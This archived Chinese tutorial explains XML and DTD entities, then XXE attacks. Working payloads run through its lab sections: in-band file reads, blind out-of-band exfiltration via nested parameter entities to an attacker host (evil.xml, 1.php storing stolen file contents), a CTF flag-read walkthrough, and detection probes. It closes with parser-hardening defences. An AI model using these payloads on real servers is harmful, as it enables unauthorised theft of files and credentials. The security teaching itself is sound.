---
title: "XXE: XML, DTDs and Out-of-Band Validation"
title_zh: "XXE：从 XML、DTD 到带外验证"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: 'From Basics to Attack: XML Entity Injection'
date: 2020-05-20 18:05:00
slug: From-Basics-to-Attack-XML-Entity-Injection
permalink: writing/From-Basics-to-Attack-XML-Entity-Injection/
topic: Application security
summary: "Explaining entity resolution, nested references and observable behavior in historical exercises."
summary_zh: "先梳理XML、DTD及各类实体的作用，再通过有回显与盲XXE实验解释实体引用顺序、嵌套误区和带外通道，最后给出题目分析及防护检查思路。"
format_label: Technical notes
featured_rank: 7
missing_images: 6
withheld_images: 0
recovered_images: 0
tags: Notes
---

## 0x01 前言

XXE是一种非常常见的漏洞类型，通常在web应用渗透中，成功利用的几率大。

本文主要从基础知识入手，引入重点，难点，误区，解决方法，实验方法，攻击方法，防御方法。

## 0x02 XML

#### 0x001 简介

**XML 被设计用来结构化、存储以及传输信息。**

**HTML 被设计用来显示数据。**

###### 什么是 XML?

- XML 指可扩展标记语言（*EX*tensible *M*arkup *L*anguage）
- XML 是一种*标记语言*，很类似 HTML
- XML 的设计宗旨是*传输数据*，而非显示数据
- XML 标签没有被预定义。您需要*自行定义标签*。
- XML 被设计为具有*自我描述性*。
- XML 是 *W3C 的推荐标准*



###### XML 与 HTML 的主要差异

- XML 不是 HTML 的替代。
- XML 和 HTML 为不同的目的而设计：
- XML 被设计为传输和存储数据，其焦点是数据的内容。
- HTML 被设计用来显示数据，其焦点是数据的外观。
- HTML 旨在显示信息，而 XML 旨在传输信息。
- XML中的空格会被保留
- XML的注释和HTML一样



###### 对XML的特点的理解

不作为，纯文本，自定义

> xml文档仅仅是包装在 XML 标签中的纯粹的信息
>
> 我们需要编写软件或者程序，才能传送、接收和显示出这个文档
>
> xml标签的功能性意义依赖于应用程序
>
> 在 HTML 中使用的标签（以及 HTML 的结构）是预定义的
>
> XML中允许创作者定义自己的标签和自己的文档结构



###### XML用途

- **XML 应用于 web 开发的许多方面，常用于简化数据的存储和共享。**
- **XML 把数据从 HTML 分离**
- **简化数据共享、数据传输、平台的变更**

#### 0x002 树结构

**XML 文档形成了一种树结构，它从“根部”开始，然后扩展到“枝叶”。**



###### 文档实例

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note>
```

第一行是 XML 声明。它定义 XML 的版本 (1.0) 和所使用的编码 (ISO-8859-1 = Latin-1/西欧字符集)。

下一行描述文档的*根元素*（像在说：“本文档是一个便签”）：``<note>``

接下来 4 行描述根的 4 个*子元素*（to, from, heading 以及 body）：

```xml
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
```

最后一行定义根元素的结尾：`</note>`



###### 文档形成树结构

XML 文档必须包含*根元素*。该元素是所有其他元素的父元素。

XML 文档中的元素形成了一棵文档树。这棵树从根部开始，并扩展到树的最底端。

所有元素均可拥有子元素：

```xml
<root>
  <child>
    <subchild>.....</subchild>
  </child>
</root>
```

父、子以及同胞等术语用于描述元素之间的关系。父元素拥有子元素。相同层级上的子元素成为同胞（兄弟或姐妹）。

所有元素均可拥有文本内容和属性（类似 HTML 中）。


###### 实例

![历史配图暂缺](redacted-image:missing)

上图表示下面的 XML 中的一本书：

```
<bookstore>
<book category="COOKING">
  <title lang="en">Everyday Italian</title> 
  <author>Giada De Laurentiis</author> 
  <year>2005</year> 
  <price>30.00</price> 
</book>
<book category="CHILDREN">
  <title lang="en">Harry Potter</title> 
  <author>J K. Rowling</author> 
  <year>2005</year> 
  <price>29.99</price> 
</book>
<book category="WEB">
  <title lang="en">Learning XML</title> 
  <author>Erik T. Ray</author> 
  <year>2003</year> 
  <price>39.95</price> 
</book>
</bookstore>
```

例子中的根元素是 `<bookstore>`。文档中的所有 `<book>` 元素都被包含在 `<bookstore>` 中。

`<book>` 元素有 4 个子元素：`<title>`、`< author>`、`<year>`、`<price>`。

#### 0x003 语法

**禁忌**

- 所有 XML 元素都须有关闭标签
- XML 标签对大小写敏感
- XML 必须正确地嵌套
- XML 文档必须有根元素
- XML 的属性值须加引号



#### 0x004 实体引用

在 XML 中，一些字符拥有特殊的意义。

如果你把字符 "<" 放在 XML 元素中，会发生错误，这是因为解析器会把它当作新元素的开始。

这样会产生 XML 错误：

```
<message>if salary < 1000 then</message>
```

为了避免这个错误，请用*实体引用*来代替 "<" 字符：

```
<message>if salary &lt; 1000 then</message> 
```

在 XML 中，有 5 个预定义的实体引用：

| &lt;   | <    | 小于   |
| ------ | ---- | ------ |
| &gt;   | >    | 大于   |
| &amp;  | &    | 和号   |
| &apos; | '    | 单引号 |
| &quot; | "    | 引号   |

**注释：**在 XML 中，只有字符 "<" 和 "&" 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。



## 0x03 DTD

#### 0x001 简介

> DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。
> 通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。
> 通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
>
> 使用 DTD 来验证您自身的数据。
>
> DTD（Document Type Definition文档类型定义）是一组机器可读的规则，它们定义XML或HTML的特定版本中允许有什么，不允许有什么。在解析网页时，浏览器将使用这些规则检查页面的有效性并且采取相应的措施。（由DTD中定义的文档类型影响）
> DTD是对HTML文档声明，还会影响浏览器的渲染模式（工作模式）。（由页面中书写DTD的方式影响）

简言之，DTD用来告诉浏览器你用的是什么标记语言



###### **内部的 DOCTYPE 声明**

DTD被包含在XML源中的表现声明形式：

```
<!DOCTYPE 根元素 [元素声明]>
```

###### **实例**

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to      (#PCDATA)>
  <!ELEMENT from    (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body    (#PCDATA)>
]>
<note>
  <to>George</to>
  <from>John</from>
  <heading>Reminder</heading>
  <body>Don't forget the meeting!</body>
</note>
```

以上 DTD 解释如下：

```
!DOCTYPE note (第二行)定义此文档是 note 类型的文档。

!ELEMENT note (第三行)定义 note 元素有四个元素："to、from、heading、body"

!ELEMENT to (第四行)定义 to 元素为 "#PCDATA" 类型

!ELEMENT from (第五行)定义 from 元素为 "#PCDATA" 类型

!ELEMENT heading (第六行)定义 heading 元素为 "#PCDATA" 类型

!ELEMENT body (第七行)定义 body 元素为 "#PCDATA" 类型
```



###### **外部文档声明**

DTD被包含在XML源头部的表现定义形式：

```
<!DOCTYPE 根元素 SYSTEM "文件名">
```

###### **实例**

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 
```

包含 DTD 的 "note.dtd" 文件：

```xml
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

#### 0x002 构建模块

所有的 XML 文档（以及 HTML 文档）均由以下简单的构建模块构成：

- 元素
- 属性
- 实体
- PCDATA
- CDATA

####  0x003元素

元素是 XML 以及 HTML 文档的*主要构建模块*。

HTML 元素的例子是 "body" 和 "table"。XML 元素的例子是 "note" 和 "message" 。元素可包含文本、其他元素或者是空的。空的 HTML 元素的例子是 "hr"、"br" 以及 "img"。

```
<!ELEMENT 元素名称 类别>
或
<!ELEMENT 元素名称 (元素内容)>
```

####  0x004属性

属性可提供*有关元素的额外信息*。

属性总是被置于某元素的开始标签中。属性总是以*名称/值*的形式成对出现的。

```
<img src="" /> 分别为<元素 属性="属性的值" />
```

属性声明使用下列语法：

```
<!ATTLIST 元素名称 属性名称 属性类型 默认值>
```

#### 0X005 DTD实体

- 实体是用来定义普通文本的变量。

- 实体引用是对实体的引用。

- 大多数同学都了解这个 HTML 实体引用："&nbsp;"。这个“无折行空格”实体在 HTML 中被用于在某个文档中插入一个额外的空格。

- 当文档被 XML 解析器解析时，实体就会被展开。

- DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量

- 可以内部声明或外部引用。

- 实体又分为一般实体和参数实体

  

  1.一般实体的声明语法:

```
<!ENTITY 实体名 "实体内容“>
```

引用实体的方式：&实体名；
2.参数实体只能在DTD中使用，参数实体的声明格式：

```
<!ENTITY % 实体名 "实体内容“>
```

引用实体的方式：%实体名；
**一般实体指代的是将来XML数据文档要用到的文本或数据，而参数实体是在DTD文档内定义的一种DTD信息，所代表的是DTD定义的一部分，不能在XML文档中使用，也不能在DTD中定义。**

###### 内部一般实体声明

语法：

```
<!ENTITY entity-name "entity-value"> 
```

实例：

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE author[
    <!ENTITY writer "Donald Duck.">
    <!ENTITY copyright "Copyright runoob.com">
]>
<author>&writer;&copyright;</author> 
```

###### 外部一般实体声明

语法：

```
<!ENTITY entity-name SYSTEM "URI/URL"> 
```

实例：

```markup
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE author[
    <!ENTITY writer SYSTEM "http://www.runoob.com/entities.dtd">
    <!ENTITY copyright SYSTEM "http://www.runoob.com/entities.dtd">
]>
<author>&writer;&copyright;</author> 
```

###### 内部参数实体

参数实体不能被应用在元素的声明当中，不能使用参数实体来定义元素，只有在外部DTD中参数实体才能被应用到元素的声明当中。
`test1.xml`

```markup
    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE person SYSTEM "test1.dtd">  
    <person>  
        <name>Jason</name>  
        <addr>Shanghai</addr>  
        <tel>18701772821</tel>  
        <br/>  
        <email>researcher@example.com</email>  
    </person>  
```

`test1.dtd`

```markup
    <?xml version="1.0" encoding="UTF-8"?>  
    <!ELEMENT person (name,addr,tel,br,email)>  
    <!ENTITY %name "(#PCDATA)">  
    <!ELEMENT addr %name;>  
    <!ELEMENT tel %name;>  
    <!ELEMENT br EMPTY>  
    <!ELEMENT email %name;>  
```

参数实体必须先定义再使用，而不能像一般实体那样随意放置。

###### 外部参数实体

能将原来很长的DTD文档转变成一个很小的、相互调用的文档集合，适合大型DTD文档的设计开发。
`test1.xml`

```markup
    <?xml version="1.0" encoding="UTF-8"?>  
    <!DOCTYPE person [  
    <!ELEMENT person (name,addr,tel,br,email)>  
    <!ENTITY % （注意这里有个空格）content SYSTEM "test1.dtd">  
    %content;  
    ]>  
    <person>  
        <name>Jason</name>  
        <addr>Shanghai</addr>  
        <tel>18701772821</tel>  
        <br/>  
        <email>researcher@example.com</email>  
    </person>  
```

`test1.dtd`

```markup
    <?xml version="1.0" encoding="UTF-8"?>  
    <!ELEMENT name (#PCDATA)>  
    <!ELEMENT addr (#PCDATA)>  
    <!ELEMENT tel (#PCDATA)>  
    <!ELEMENT br EMPTY>  
    <!ELEMENT email (#PCDATA)>  
```

#### 0x006 PCDATA

- PCDATA 的意思是被解析的字符数据（parsed character data）。
- 可把字符数据想象为 XML 元素的开始标签与结束标签之间的文本。
- PCDATA 是会被解析器解析的文本。
- 这些文本将被解析器检查实体以及标记。
- 文本中的标签会被当作标记来处理，而实体会被展开。
- 被解析的字符数据不应当包含任何 &、< 或者 > 字符；
- 需要使用 &、< 以及 > 实体来分别替换它们。

#### 0x007 CDATA

- CDATA 的意思是字符数据（character data）。
- CDATA 是不会被解析器解析的文本。
- 在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。



## 0x04 XML实体注入实例

> 找一台服务器，一台本地主机，服务器作为靶机测试

#### 0x001 有回显测试

在靶机新建test.php

```php
<?php
$xml=$_GET['xml'];
$data = @simplexml_load_string($xml);
print_r($data);
//simplexml_load_string() 函数转换形式良好的 XML 字符串为 SimpleXMLElement 对象。
?>
```

123.txt

```txt
test succeed
```

###### 外部实体读取文件

payload：

```
靶机ip?xml=<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY file SYSTEM "file://123.txt">
]>
<root><note>&file;</note></root>
```

读取靶机123.txt回显：

```
SimpleXMLElement Object ( [file] => SimpleXMLElement Object ( [file] => test succeed )
```

###### 引用DTD文件

payload:

```
靶机ip?xml=<?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE note [<!ENTITY % a SYSTEM "http://192.0.2.30/dtdfile.dtd"> %a;]>
 <note>&file;</note>
```

在本机新建dtd文件(dtdfile.dtd):

```
<!ENTITY file SYSTEM "file://123.txt">
```

读取靶机123.txt回显：

```
SimpleXMLElement Object ( [file] => SimpleXMLElement Object ( [file] => test succeed )
```

#### 0x002 无回显测试

可以将结果打到服务器上，查看日志，或则将结果保存为文件

###### 引用远程服务器上的XML文件读取文件

payload:

xxe.xml

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag">
<!ENTITY % remote SYSTEM "http://your_vps/test.dtd">
%remote;
%all;
]>
<root>&send;</root>
```

test.dtd

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://your_vps/get.php?file=%file;'>">
```

注意:**参数实体引用不能出现在内部DTD的标记声明内部**

> 在内部DTD中引入参数实体不能写在标记声明内部，但可写在DTD中标记出现的地方，也就是标记外。
>
> 如果想在DTD标记声明中引入参数实体，那么就必须用外部DTD。

**使用的[php://filter](https://link.jianshu.com/?t=php%3A%2F%2Ffilter)将文件内容进行了base64编码，因为当我们读取的文件是php或则html文件时，文件的代码包含`<` `>`符号时会导致解析错误**
**这里声明payload实体参数，该实体参数以base64编码方式读取了靶机中123.txt文件内容，然后做为URL参数请求到自己的服务器上。**



## 0x05 XXE

#### 0x001 Blind XXE原理

带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系。

#### 0x002 误区

直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % param1 "file:///c:/1.txt">
<!ENTITY % param2 "http://127.0.0.1/?%param1">
%param2;
]>
```

内部实体嵌套的形式：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % param1 "file:///c:/1.txt">
<!ENTITY % param2 "<!ENTITY % param222 SYSTEM'http://127.0.0.1/?%param1;'>">
%param2;
]>
<root>
[This is my site]
</root>
```

**但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。**

#### 0x003 误区解决方案

将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。

如下：

source file

 ```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///C:/1.txt">
<!ENTITY % remote SYSTEM "http://192.0.2.40/evil.xml">
%remote;
%all;
]>
<root>&send;</root>
 ```

evil.xml

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.0.2.40/1.php?file=%file;'>">
```

实体remote，all，send的引用顺序很重要:

- 首先对remote引用目的是将外部文件evil.xml引入到解释上下文中，
- 然后执行%all，
- 这时会检测到send实体，
- 在root节点中引用send，
- 就可以成功实现数据转发。

当然，也直接在DTD中引用send实体，**如果在evil.xml中，send是个参数实体的话**，即以下方式：

source file

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///C:/1.txt">
<!ENTITY % remote SYSTEM "http://192.0.2.40/evil.xml">
%remote;
 %all;
%send;
]>
```

evil.xml

```XML
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.0.2.40/1.php?file=%file;'>">
```

#### 0x004 攻击测试

> 攻击机：本机，靶机：服务器

test.php

```php
<?php
$xml=<<<EOF
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "file:///E:/passwd.txt">
<!ENTITY % remote SYSTEM "http://192.0.2.40/evil.xml">
%remote;
%all;
	%send;
]>
EOF;
$data = simplexml_load_string($xml) ;
echo "<pre>" ;
print_r($data) ;
?>
```

evil.xml

```xml
<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.0.2.40/1.php?file=%file;'>">
```

1.php

```php
<?php
file_put_contents("1.txt", $_GET['file']) ;
?>
```

攻击方法:

- 模拟攻击者构造XXE请求：访问``http://localhost/test.php,`` 
- 然后存在漏洞的服务器会读出file的内容（E:/1.txt）
- 通过带外通道发送给攻击者服务器上的1.php，
- 1.php做的事情就是把读取的数据保存到本地的1.txt中，
- 完成Blind XXE攻击。

#### 0x005 一道CTF题看XXE

[访问题目链接](http://web.jarvisoj.com:9882/)

![历史配图暂缺](redacted-image:missing)

输入什么都无反应或回显

burp抓包

![历史配图暂缺](redacted-image:missing)

我们把content-type改成application/xml的类型，然后下方就可以写入xml代码，先用dtd内部注入看一下能执行不

![历史配图暂缺](redacted-image:missing)

发现可以成功执行，外部实体注入的话这里没有服务器，不能够测试，那么直接外部注入看是否成功

![历史配图暂缺](redacted-image:missing)

发现可以读取文件，那么直接读取home/ctf/flag.txt内容

![历史配图暂缺](redacted-image:missing)

flag读取成功！

#### 0x006 防御XXE攻击

1.使用开发语言提供的禁用外部实体

```
PHP：
libxml_disable_entity_loader(true);

JAVA:
DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
dbf.setExpandEntityReferences(false);

Python：
from lxml import etree
xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
```

2.过滤用户提交的XML数据

```
关键词：<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC。
```

#### 0x007 判断是否存在XXE漏洞

1.检测XML是否会被解析

```markup
<?xml version=”1.0” encoding=”UTF-8”?>   
<!DOCTYPE ANY [       
<!ENTITY shit “this is shit”>  
]>    
<root>&shit;</root>  
```

如果$shit;变成了”this is shit”，那就继续第二步。
2.检测服务器是否支持外部实体：

```markup
<?xml version=”1.0” encoding=”UTF-8”?>  
<!DOCTYPE ANY [  
<!ENTITY % shit SYSTEM “http://yourhost/evil.xml”>  
%shit;  
]>  
```

通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。
3.如果上面两步都支持，就看是否回显。如果能回显就直接引用外部实体注入。有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。
4.如果不能回显，就用**Blind XXE攻击方法。**

## 0x06 参考

https://blog.csdn.net/u011721501/article/details/43775691

https://www.smi1e.top/dsada/

https://www.cnblogs.com/-chenxs/p/11374614.html
